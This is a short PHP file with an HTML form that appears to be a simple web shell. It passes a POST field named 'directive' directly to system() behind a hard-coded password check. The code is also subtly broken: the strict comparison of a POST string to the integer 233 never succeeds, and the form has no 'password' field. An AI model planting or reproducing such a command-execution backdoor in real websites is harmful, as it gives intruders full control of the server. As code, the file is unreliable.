<?php
if(isset($_POST['password'])){
    session_start();
    if($_POST['password']===233){
        system($_POST['directive']);
    }else{
        echo "密码不正确";
    }
}
?>
<form method="post">
    <label id="input">
        <input type="password" name="directive" >
        <input type="text" name="directive" >
        <input type="submit" name="submit">
    </label>
</form>